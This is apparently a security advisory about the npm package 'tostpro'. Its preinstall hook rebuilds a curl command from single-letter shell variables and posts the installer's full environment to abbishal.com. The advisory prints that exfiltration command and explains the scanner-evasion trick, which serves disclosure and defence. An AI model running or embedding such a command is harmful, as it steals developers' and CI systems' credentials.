summary: tostpro preinstall exfiltrates environment variables to abbishal.com
details: On `npm install`, the preinstall lifecycle hook executes test.sh, which reconstructs the command `curl -d "$(env)" https://abbishal.com/sh/poc` from single-letter shell variables (b=e, i=c, s=n, h=u, a=v, l=rl concatenated as $i$h$l / $b$s$a) to hide the words `curl` and `env` from registry scanners. The resulting POST ships the installer's full process environment — including CI tokens, cloud credentials, and NPM_TOKEN-style secrets — to the author-controlled host abbishal.com. The package declares `main: dist/index.js` but the dist/ directory is absent from the tarball, so there is no library functionality; the sole effect of installing this package is the exfiltration payload. The README's claims that the script 'collects nothing' and is 'invisible to npm's malware scanners' directly contradict the shipped code.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
